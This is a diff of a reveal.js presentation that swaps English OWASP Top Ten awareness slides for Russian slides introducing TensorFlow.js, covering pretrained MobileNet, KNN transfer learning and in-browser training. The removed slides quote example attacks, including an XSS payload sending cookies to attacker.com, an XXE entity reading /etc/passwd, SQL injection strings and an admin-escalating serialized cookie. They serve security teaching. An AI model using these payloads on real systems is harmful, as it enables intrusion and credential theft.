@@ -9,236 +9,299 @@
 		<link rel="stylesheet" href="dist/reset.css">
 		<link rel="stylesheet" href="dist/reveal.css">
 		<link rel="stylesheet" href="dist/theme/black.css" id="theme">
-
-		<!-- Theme used for syntax highlighted code -->
 		<link rel="stylesheet" href="plugin/highlight/monokai.css" id="highlight-theme">
-		<style>
-			.reveal .owasp-title {
-				color: rgb(0, 129, 235);
-			}
-			.reveal .owasp-subtitle {
-				color: rgb(255, 197, 88);
-			}
-			.reveal .risk-title {
-				color: red;
-			}
-			.reveal .risk-subtitle_danger {
-				color: rgb(251, 255, 0);
-			}
-			.reveal .risk-subtitle_safety {
-				color: rgb(4, 235, 4);
-			}
-			.reveal .injection-list {
-				font-size: 26px;
-			}
-			.reveal .injection-code {
-				text-align: center;
-				word-wrap: break-word;
-			}
-			.reveal .paragraph-smaller {
-				font-size: 30px;
-			}
-			.reveal .injection-pre {
-				box-shadow: none;
-			}
-			.reveal .strong {
-				font-weight: bold;
-				color: orange;
-			}
-			.reveal .paragraph-smallest {
-				font-size: 24px;
-			}
-		</style>
+		
 	</head>
 	<body>
-		<div class="reveal">
-      <div class="slides">
-				<section>
-					<img src="./images/main.png" alt="logo" class="logo">
-				</section>
-				<section>
-					<h1 class="owasp-title">OWASP Top Ten</h1>
-					<p>The OWASP Top 10 is a standard awareness document for developers and web application security.</p>
-					<p>It represents a broad consensus about the most critical security risks to web applications.</p>
-				</section>
-				<section data-transition="zoom">
-					<h1 class="owasp-subtitle">Top 10 Web Application Security Risks</h1>
-				</section>
-				<section data-transition="concave">
-					<section data-transition="convex">
-						<h2 class="risk-title">Injection</h2>
-						<img src="./images/injection.jpg" alt="injection">
-						<p class="paragraph-smaller">Injection flaws, such as SQL, NoSQL, OS, and LDAP injection, occur when untrusted data is sent to an interpreter as part of a command or query. The attacker’s hostile data can trick the interpreter into executing unintended commands or accessing data without proper authorization</p>
-					</section>
-					<section data-transition="convex">
-						<h3 class="risk-subtitle_danger">Example Attack Scenarios</h3>
-						<p class="paragraph-smaller"><strong class="strong">Scenario #1:</strong> An application uses untrusted data in the construction of the following vulnerable SQL call:</p>
-						<pre class="injection-pre">
-							<code class="injection-code" data-trim data-noescape>String query = "SELECT * FROM accounts<br>WHERE custID='" + request.getParameter("id") + "'";</code>
-						</pre>
-					</section>
-					<section data-transition="convex">
-						<p class="paragraph-smaller"><strong class="strong">Scenario #2:</strong> Similarly, an application’s blind trust in frameworks may result in queries that are still vulnerable, (e.g. Hibernate Query Language (HQL)):</p>
-						<pre class="injection-pre">
-							<code class="injection-code" data-trim data-noescape>Query HQLQuery = session.createQuery("FROM accounts<br>WHERE custID='" + request.getParameter("id") + "'");</code>
-						</pre>
-						<p class="paragraph-smaller">In both cases, the attacker modifies the ‘id’ parameter value in their browser to send: ‘ or ‘1’=’1. For example:</p>
-						<pre><code class="injection-code" data-trim data-noescape>http://example.com/app/accountView?id=' or '1'='1</code></pre>
-					</section>
-					</section>
-				</section>
-				<section data-transition="concave">
-					<section data-transition="convex">
-						<h2 class="risk-title">Broken Authentication</h2>
-						<img src="./images/broken_auth.jpg" alt="broken authentication">
-						<p class="paragraph-smaller"> Application functions related to authentication and session management are often implemented incorrectly, allowing attackers to compromise passwords, keys, or session tokens, or to exploit other implementation flaws to assume other users’ identities temporarily or permanently.</p>
-					</section>
-					<section data-transition="convex">
-						<h3 class="risk-subtitle_danger">Example Attack Scenarios</h3>
-						<p class="paragraph-smaller"><strong class="strong">Scenario #1: </strong>Credential stuffing, the use of lists of known passwords, is a common attack.</p>
-						<p class="paragraph-smaller"><strong class="strong">Scenario #2:</strong> Most authentication attacks occur due to the continued use of passwords as a sole factor. Once considered best practices, password rotation and complexity requirements are viewed as encouraging users to use, and reuse, weak passwords.</p>
-						<p class="paragraph-smaller"><strong class="strong">Scenario #3:</strong> Application session timeouts aren’t set properly.</p>
-					</section>
-				</section>
-				<section data-transition="concave">
-					<section data-transition="convex">
-						<h2 class="risk-title">Sensitive Data Exposure</h2>
-						<img src="./images/sensative_data.jpg" alt="sensitive data">
-						<p class="paragraph-smaller">Many web applications and APIs do not properly protect sensitive data, such as financial, healthcare, and personal data. Attackers may steal or modify such weakly protected data to conduct credit card fraud, identity theft, or other crimes.</p>
-					</section>
-					<section data-transition="convex">
-						<h3 class="risk-subtitle_danger">Example Attack Scenarios</h3>
-						<p class="paragraph-smaller"><strong class="strong">Scenario #1: </strong>An application encrypts credit card numbers in a database using automatic database encryption. </p>
-						<p class="paragraph-smaller"><strong class="strong">Scenario #2:</strong> A site doesn’t use or enforce TLS for all pages or supports weak encryption.</p>
-						<p class="paragraph-smaller"><strong class="strong">Scenario #3:</strong> The password database uses unsalted or simple hashes to store everyone’s passwords.</p>
-					</section>
-				</section>
-				<section data-transition="concave">
-					<section data-transition="convex">
-						<h2 class="risk-title">XML External Entities (XXE)</h2>
-						<img src="./images/XXE.jpg" alt="xxe">
-						<p class="paragraph-smaller">Many older or poorly configured XML processors evaluate external entity references within XML documents. External entities can be used to disclose internal files using the file URI handler, internal file shares, internal port scanning, remote code execution, and denial of service attacks.</p>
-					</section>
-					<section data-transition="convex">
-						<h3 class="risk-subtitle_danger">Example Attack Scenarios</h3>
-						<p class="paragraph-smaller"><strong class="strong">Scenario #1: </strong>The attacker attempts to extract data from the server:</p>
-						<pre class="injection-pre">
-							<code class="injection-code" data-trim data-noescape>
-								&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
-								&lt;!DOCTYPE foo [
-								&lt;!ELEMENT foo ANY &gt;
-								&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;
-								&lt;foo&gt;&xxe;&lt;/foo&gt;
-							</code>
-						</pre>
-						<p class="paragraph-smaller"><strong class="strong">Scenario #2:</strong> An attacker probes the server’s private network by changing the above ENTITY line to:</p>
-						<pre class="injection-pre">
-							<code class="injection-code" data-trim data-noescape>
-								&lt;!ENTITY xxe SYSTEM "https://192.168.1.1/private" &gt;]&gt;
-							</code>
-						</pre>
-					</section>
-				</section>
-				<section data-transition="concave">
-					<section data-transition="convex">
-						<h2 class="risk-title">Broken Access Control</h2>
-						<img src="./images/broken_access.jpg" alt="broken access">
-						<p class="paragraph-smaller">Restrictions on what authenticated users are allowed to do are often not properly enforced.</p>
-					</section>
-					<section data-transition="convex">
-						<h3 class="risk-subtitle_danger">Example Attack Scenarios</h3>
-						<p><strong class="strong">Scenario #1: </strong>The application uses unverified data in a SQL call that is accessing account information:</p>
-						<pre class="injection-pre">
-							<code class="injection-code" data-trim data-noescape>
-								pstmt.setString(1, request.getParameter("acct"));
-								ResultSet results = pstmt.executeQuery( );
-							</code>
-						</pre>
-						<p>An attacker simply modifies the ‘acct’ parameter in the browser to send whatever account number they want. If not properly verified, the attacker can access any user’s account.</p>
-						<pre class="injection-pre">
-							<code class="injection-code" data-trim data-noescape>
-								http://example.com/app/accountInfo?acct=notmyacct
-							</code>
-						</pre>
-					</section>
-					</section>
-				</section>
-				<section data-transition="concave">
-					<section data-transition="convex">
-						<h2 class="risk-title">Security misconfiguration</h2>
-						<p>Security misconfiguration is the most commonly seen issue. This is commonly a result of insecure default configurations, incomplete or ad hoc configurations, open cloud storage, misconfigured HTTP headers, and verbose error messages containing sensitive information.</p>
-					</section>
-				</section>
-				<section data-transition="concave">
-					<section data-transition="convex">
-						<h2 class="risk-title">Cross-Site Scripting (XSS)</h2>
-						<img src="./images/xss.jpg" alt="xss">
-						<p class="paragraph-smaller">XSS flaws occur whenever an application includes untrusted data in a new web page without proper validation or escaping, or updates an existing web page with user-supplied data using a browser API that can create HTML or JavaScript.</p>
-					</section>
-					<section data-transition="convex">
-						<h3 class="risk-subtitle_danger">Example Attack Scenarios</h3>
-						<p class="paragraph-smaller"><strong class="strong">Scenario #1: </strong>The application uses untrusted data in the construction of the following HTML snippet without validation or escaping:</p>
-						<pre class="injection-pre">
-							<code class="injection-code" data-trim data-noescape>
-								(String) page += "&lt;input name='creditcard' type='TEXT' <br>value='" + request.getParameter("CC") + "'&gt;";
-							</code>
-						</pre>
-						<p class="paragraph-smallest">The attacker modifies the ‘CC’ parameter in the browser to:</p>
-						<pre class="injection-pre">
-							<code class="injection-code" data-trim data-noescape>
-								'&gt;&lt;script&gt;document.location=<br>'http://www.attacker.com/cgi-bin/cookie.cgi?<br>foo='+document.cookie&lt;/script&gt;'.
-							</code>
-						</pre>
-					</section>
-				</section>
-				<section data-transition="concave">
-					<section data-transition="convex">
-						<h2 class="risk-title">Insecure Deserialization</h2>
-						<img src="./images/serialization.jpg" alt="insecure serialization">
-						<p class="paragraph-smaller">Insecure deserialization often leads to remote code execution. Even if deserialization flaws do not result in remote code execution, they can be used to perform attacks, including replay attacks, injection attacks, and privilege escalation attacks.</p>
-					</section>
-					<section data-transition="convex">
-						<h3 class="risk-subtitle_danger">Example Attack Scenarios</h3>
-						<p class="paragraph-smaller"><strong class="strong">Scenario #1: </strong>A React application calls a set of Spring Boot microservices. Being functional programmers, they tried to ensure that their code is immutable.</p>
-						<p class="paragraph-smaller"><strong class="strong">Scenario #2:</strong> A PHP forum uses PHP object serialization to save a “super” cookie, containing the user’s ID, role, password hash, and other state:</p>
-						<pre class="injection-pre">
-							<code class="injection-code" data-trim data-noescape>
-								a:4:{i:0;i:132;i:1;s:7:"Mallory";i:2;s:4:"user";
-								i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}
-							</code>
-						</pre>
-						<p class="paragraph-smaller">An attacker changes the serialized object to give themselves admin privileges:</p>
-						<pre class="injection-pre">
-							<code class="injection-code" data-trim data-noescape>
-								a:4:{i:0;i:1;i:1;s:5:"Alice";i:2;s:5:"admin";
-								i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}
-							</code>
-						</pre>
-					</section>
-				</section>
-				<section data-transition="concave">
-					<section data-transition="convex">
-						<h2 class="risk-title">Using Components with Known Vulnerabilities</h2>
-						<img src="./images/known_vulnerability.jpg" alt="known vulnerability">
-						<p class="paragraph-smaller">Components, such as libraries, frameworks, and other software modules, run with the same privileges as the application. If a vulnerable component is exploited, such an attack can facilitate serious data loss or server takeover.</p>
-					</section>
-					<section data-transition="convex">
-						<h3 class="risk-subtitle_danger">Example Attack Scenarios</h3>
-						<p class="paragraph-smaller"><strong class="strong">Scenario #1: </strong>Components typically run with the same privileges as the application itself, so flaws in any component can result in serious impact. Such flaws can be accidental (e.g. coding error) or intentional (e.g. backdoor in component).</p>
-					</section>
-				</section>
-				<section data-transition="concave">
-					<section data-transition="convex">
-						<h2 class="risk-title">Insufficient Logging & Monitoring</h2>
-						<p>Insufficient logging and monitoring, coupled with missing or ineffective integration with incident response, allows attackers to further attack systems, maintain persistence, pivot to more systems, and tamper, extract, or destroy data.</p>
-					</section>
-					<section data-transition="convex">
-						<h3 class="risk-subtitle_danger">Example Attack Scenarios</h3>
-						<p class="paragraph-smaller"><strong class="strong">Scenario #1: </strong>An open source project forum software run by a small team was hacked using a flaw in its software. The attackers managed to wipe out the internal source code repository containing the next version, and all of the forum contents. Although source could be recovered, the lack of monitoring, logging or alerting led to a far worse breach. The forum software project is no longer active as a result of this issue.</p>
-						<p class="paragraph-smaller"><strong class="strong">Scenario #2: </strong>An attacker uses scans for users using a common password. They can take over all accounts using this password. For all other users, this scan leaves only one false login behind. After some days, this may be repeated with a different password.</p>
-						<p class="paragraph-smaller"><strong class="strong">Scenario #3: </strong>A major US retailer reportedly had an internal malware analysis sandbox analyzing attachments. The sandbox software had detected potentially unwanted software, but no one responded to this detection. The sandbox had been producing warnings for some time before the breach was detected due to fraudulent card transactions by an external bank.</p>
-					</section>
-				</section>
+		<section>
+          <h1>Применение машинного обучения во фронтенде</h1>
+          <h2>Tensorflow.js</h2>
+        </section>
+        <section data-transition="convex">
+          <p>
+            Часто кажется, что машинное обучение подчиняется сугубо специалистам
+            по анализу данных и разработчикам Python. Однако за последние годы
+            были созданы платформы с открытым исходным кодом, делающие машинное
+            обучение более доступным на разных языках программирования, включая
+            JavaScript.
+          </p>
+          <p>
+            Tensorflow.js - это Javascript библиотека, созданная Google, для
+            встраивания возможностей машинного обучения в любую форму
+            веб-приложения.
+          </p>
+        </section>
+        <section data-transition="convex">
+          <p>
+            Наиболее распространенное определение машинного обучения звучит так:
+            машинное обучение — это способность компьютеров учиться на данных
+            без явного программирования.
+          </p>
+          <p>
+            Если сравнивать машинное обучение с традиционным программированием,
+            то можно сказать, что при машинном обучении мы даем возможность
+            компьютерам идентифицировать определенные паттерны в данных и
+            создавать на их основе прогнозы без необходимости получения точных
+            указаний, что искать.
+          </p>
+        </section>
+        <section data-transition="concave">
+          <p>Рассмотрим несколько общих терминов:</p>
+          <dl>
+            <dt>Модель</dt>
+            <dd>
+              Когда вы тренируете алгоритм машинного обучения с набором данных,
+              модель является результатом этого процесса обучения. Это похоже на
+              функцию, которая принимает входные данные и в качестве выходных
+              данных выдает прогноз.
+            </dd>
+            <dt>Метки и свойства</dt>
+            <dd>
+              Метки и свойства относятся к данным, которые вы предоставляете
+              алгоритму в процессе обучения. Метка — ваша классификация записи в
+              наборе данных. Например, если набор данных представляет собой
+              CSV-файл, описывающий животных, то метками могут быть «кошка»,
+              «собака» или, например, «змея». Свойства, с другой стороны,
+              являются характеристиками записи в наборе данных. В примере с
+              животными это могут быть «усатые, мяукающие», «игривые, лающие»,
+              «пресмыкающиеся, ползучие» и так далее. Используя эти данные,
+              алгоритм машинного обучения сможет найти корреляцию между
+              свойствами и меткой и использовать ее для будущих прогнозов.
+            </dd>
+            <dt>Нейронные сети</dt>
+            <dd>
+              Нейронные сети — это набор алгоритмов машинного обучения,
+              пытающихся имитировать работу мозга, используя слои искусственных
+              нейронов.
+            </dd>
+          </dl>
+        </section>
+        <section data-transition="concave">
+          <h2>
+            Способы использования JavaScript и инфраструктуры Tensorflow.js
+          </h2>
+          <ul>
+            <li>Предварительно обученная модель</li>
+            <li>Трансферное обучение</li>
+            <li>Создание, запуск и использование собственной модели</li>
+          </ul>
+        </section>
+        <section data-transition="convex">
+          <h2>Предварительно обученная модель</h2>
+          <p>
+            В зависимости от решаемой проблемы может оказаться, что необходимая
+            модель уже существует и обучена с определенным набором данных. Такую
+            модель можно просто импортировать в свой код.
+          </p>
+          <p>
+            Например, мы создаем веб-сайт для определения, изображен ли на
+            картинке кот. Популярная модель классификации изображений называется
+            MobileNet и доступна в виде предварительно обученной модели с
+            Tensorflow.js.
+          </p>
+        </section>
+        <section data-transition="convex">
+          <p>Код для сайта будет выглядеть следующим образом:</p>
+          <pre><code>
+						<html lang="en">
+							<head>
+								<meta charset="UTF-8">
+								<meta name="viewport" content="width=device-width, initial-scale=1.0">
+								<meta http-equiv="X-UA-Compatible" content="ie=edge">
+								<title>Cat detection</title>
+								<!-- импорт Tensorflow.js и модели MobileNet -->
+								<script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs@1.0.1"> </script>
+								<script src="https://cdn.jsdelivr.net/npm/@tensorflow-models/mobilenet@1.0.0"> </script>
+							</head>
+							<body>
+								<!--внутри тега body у нас есть элемент изображения, который будет использоваться для прогнозов-->
+								<img id="image" alt="cat laying down" src="cat.jpeg"/>
+								<!--внутри тега script у нас есть JavaScript-код, загружающий предварительно обученную модель
+									MobileNet и классифицирующий изображение, найденное в теге image. Он возвращает массив из
+									трех прогнозов, которые упорядочены по степени вероятности-->
+								<script>
+									const img = document.getElementById('image');
+									const predictImage = async () => {
+										console.log("Model loading...");
+										const model = await mobilenet.load();
+										console.log("Model is loaded!")
+										const predictions = await model.classify(img);
+										console.log('Predictions: ', predictions);
+									}
+									predictImage();
+								</script>
+							</body>
+						</html>
+					</code></pre>
+        </section>
+        <section data-transition="concave">
+          <h2>Трансферное обучение</h2>
+          <p>
+            Трансферное обучение — это способность комбинировать предварительно
+            обученную модель с пользовательскими данными обучения. Это означает,
+            что вы можете использовать функциональность модели и добавлять свои
+            собственные данные, не создавая все с нуля.
+          </p>
+          <p>
+            Например, алгоритм был обучен тысячами изображений для создания
+            модели классификации изображений, и вместо того, чтобы создавать
+            очередную модель, трансферное обучение позволяет комбинировать
+            пользовательские данные изображений с предварительно обученной
+            моделью для создания нового классификатора изображений. Эта функция
+            позволяет быстро и легко иметь более индивидуальный классификатор.
+          </p>
+          <p>
+            Переориентируем предыдущий пример на классификацию новых
+            изображений.
+          </p>
+          <img
+            src="./img/transfer-learning.gif"
+            alt="transfer-learning image"
+          />
+        </section>
+        <section data-transition="concave">
+          <p>
+            Импортируем Tensorflow.js и MobileNet, а также классификатор KNN
+            (k-ближайших соседей):
+          </p>
+          <pre><code>
+						<!-- Загрузка TensorFlow.js -->
+						<script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs"></script>
+						<!-- Загрузка MobileNet -->
+						<script src="https://cdn.jsdelivr.net/npm/@tensorflow-models/mobilenet"></script>
+						<!-- Загрузка KNN классификатора -->
+						<script src="https://cdn.jsdelivr.net/npm/@tensorflow-models/knn-classifier"></script>
+					</code></pre>
+          <p>
+            Классификатор нужен потому что (вместо того, чтобы использовать
+            только модуль MobileNet) мы добавляем пользовательские образцы,
+            которые модель никогда не встречала. Классификатор KNN позволит нам
+            соединить все вместе и выполнить прогнозы для объединенных данных.
+          </p>
+          <p>
+            Изображение кота заменим тегом video, чтобы использовать изображения
+            с камеры
+          </p>
+          <p>
+            Также добавим на страницу кнопки, которые мы будем использовать в
+            качестве меток для записи образцов видео и запуска прогнозов
+          </p>
+        </section>
+        <section data-transition="concave">
+          <p>В JavaScript файле установим несколько важных переменных</p>
+          <pre><code>
+						// Количество классов для классификации
+						const NUM_CLASSES = 2;
+						// Метки классов
+						const classes = ["Left", "Right"];
+						// Размер веб-камеры. Должен быть 227.
+						const IMAGE_SIZE = 227;
+						// Значение K для KNN
+						const TOPK = 10;
+						const video = document.getElementById("webcam");
+					</code></pre>
+          <p>
+            В этом конкретном примере мы хотим иметь возможность
+            классифицировать входные данные веб-камеры между наклоном головы
+            влево или вправо, поэтому нам нужны два класса: left и right. Размер
+            изображения, установленный на 227, представляет собой размер
+            элемента видео в пикселях. На основе примеров Tensorflow.js это
+            значение должно быть установлено равным 227, чтобы соответствовать
+            формату данных, с которыми была обучена модель MobileNet. Чтобы
+            иметь возможность классифицировать новые данные, они должны
+            соответствовать тому же формату.
+          </p>
+          <p>
+            Устанавливаем значение K равным 10. Значение K в алгоритме KNN
+            важно, потому что оно представляет количество экземпляров, которые
+            мы учитываем при определении класса нашего ввода. В этом случае
+            значение 10 означает, что при прогнозировании метки для некоторых
+            новых данных мы будем смотреть на 10 ближайших соседей из обучающих
+            данных, чтобы определить, как классифицировать новый вход.
+          </p>
+        </section>
+        <section data-transition="concave">
+          <p>
+            Функция, которая будет брать образцы изображений с веб-камеры,
+            форматировать и комбинировать их с модулем MobileNet:
+          </p>
+          <pre><code>
+						// Получение данных изображения из элемента видео
+						const image = tf.browser.fromPixels(video);
+						let logits;
+						// 'conv_preds' - активация логитов MobileNet.
+						const infer = () => this.mobilenetModule.infer(image, "conv_preds");
+						// Тренировка класса, если одна из кнопок нажата
+						if (this.training != -1) {
+							logits = infer();
+							// Добавление текущего изображения в классификатор
+							this.knn.addExample(logits, this.training);
+						}
+					</code></pre>
+          <p>
+            Cобрав несколько изображений с веб-камеры, можно проверить прогнозы
+            с помощью следующего кода:
+          </p>
+          <pre><code>
+						logits = infer();
+						const res = await this.knn.predictClass(logits, TOPK);
+						const prediction = classes[res.classIndex];
+					</code></pre>
+        </section>
+        <section data-transition="convex">
+          <h2>Создание, запуск и использование собственной модели</h2>
+          <p>
+            Последний способ использования — создать, обучить и запустить модель
+            целиком в браузере.
+          </p>
+          <p>
+            В основе каждого проекта машинного обучения лежит набор данных.
+            Одним из первых шагов, которые нужно предпринять, является
+            разделение этого набора данных на тренировочный набор и тестовый
+            набор. Причина заключается в том, что мы собираемся использовать
+            тренировочный набор для обучения алгоритма, тестовый набор — для
+            проверки точности прогнозов: готова ли модель к использованию или
+            нуждается в доработке.
+          </p>
+          <p>Шаги по созданию собственной модели:</p>
+          <ul>
+            <li>Сбор данных</li>
+            <li>Разделение данных на тренировочные и тестовые</li>
+            <li>Преобразование данных, чтобы Tensorflow.js мог их понять</li>
+            <li>Выбор алгоритма</li>
+            <li>Обучение</li>
+            <li>Предсказание</li>
+          </ul>
+        </section>
+        <section data-transition="convex">
+          <h2>Ограничения использования машинного обучения в веб-интерфейсе</h2>
+          <p>
+            Производительность Импорт предварительно обученной модели из
+            внешнего источника может повлиять на производительность приложения.
+            Например, некоторые модели обнаружения объектов занимают более 10
+            мегабайт, что значительно замедляет работу сайта.
+          </p>
+          <p>
+            Качество входных данных При построении модели с нуля, придется
+            собирать собственные данные или находить наборы данных с открытым
+            исходным кодом. Прежде чем выполнять какую-либо обработку данных или
+            пробовать различные алгоритмы, обязательно проверьте качество
+            входных данных. Например, если вы пытаетесь построить модель анализа
+            настроений для распознавания эмоций в тексте, убедитесь, что данные,
+            которые вы используете для обучения модели, точны и разнообразны.
+            Если качество используемых данных низкое, результаты обучения будут
+            бесполезны.
+          </p>
+          <p>
+            Ответственность Использование предварительно обученной модели с
+            открытым исходным кодом может быть очень быстрым и легким. Однако
+            это также означает, что вы не всегда знаете, как она была
+            сгенерирована, каков был набор данных или даже какой алгоритм
+            использовался. Некоторые модели называются «черными ящиками», а это
+            означает, что вы на самом деле не знаете, как они предсказывали
+            определенный результат.
+          </p>
+        </section>
       </div>
     </div>
 		<script src="dist/reveal.js"></script>
